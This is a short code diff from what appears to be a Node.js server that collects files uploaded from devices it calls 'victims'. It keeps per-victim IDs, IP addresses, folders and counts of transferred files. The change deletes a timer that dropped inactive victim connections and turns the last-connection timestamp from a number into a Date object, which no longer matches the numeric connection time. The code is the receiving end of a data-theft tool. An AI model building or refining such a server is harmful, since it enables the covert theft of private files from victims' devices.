@@ -56,22 +56,6 @@ const connectedDevices = {};
 // Track received chunks
 const chunkTracker = new Map();
 
-// Function to check for inactive clients
-const checkInactiveClients = () => {
-  const now = Date.now();
-  for (const [victimId, device] of Object.entries(connectedDevices)) {
-    if (now - device.lastConnectionTime > 6000) { // 6 seconds
-      console.log(`🚪 Closing connection for inactive client: ${victimId}`);
-      device.endConnectionTime = new Date();
-      device.totalFilesReceivedTime = device.endConnectionTime - device.connectionTime;
-      delete connectedDevices[victimId];
-    }
-  }
-};
-
-// Set interval to check for inactive clients every second
-setInterval(checkInactiveClients, 1000);
-
 // Route to handle file uploads
 app.post('/upload', (req, res) => {
   try {
@@ -103,12 +87,12 @@ app.post('/upload', (req, res) => {
       connectedDevices[victimId] = {
         ip: ip,
         connectionTime: Date.now(),  // Record connection time in milliseconds
-        lastConnectionTime: Date.now(),
+        lastConnectionTime: new Date(),
         filesTransferred: 0,
         fileList: [],
       };
     } else {
-      connectedDevices[victimId].lastConnectionTime = Date.now();
+      connectedDevices[victimId].lastConnectionTime = new Date();
     }
 
     if (!victimFolders[victimId]) {
